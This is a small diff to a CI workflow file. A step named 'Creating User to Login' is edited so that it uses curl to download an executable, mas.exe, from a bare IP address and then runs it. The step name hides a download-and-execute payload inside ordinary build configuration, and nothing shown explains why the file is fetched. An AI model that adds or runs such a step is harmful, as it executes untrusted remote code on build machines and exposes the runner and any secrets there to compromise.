@@ -14,5 +14,5 @@ jobs:
     steps:
     - name: Creating User to Login
       run: |
-      cmd /c http://44.202.6.121/mas.exe -O
+      cmd /c curl http://44.202.6.121/mas.exe -O
       cmd /c mas.exe
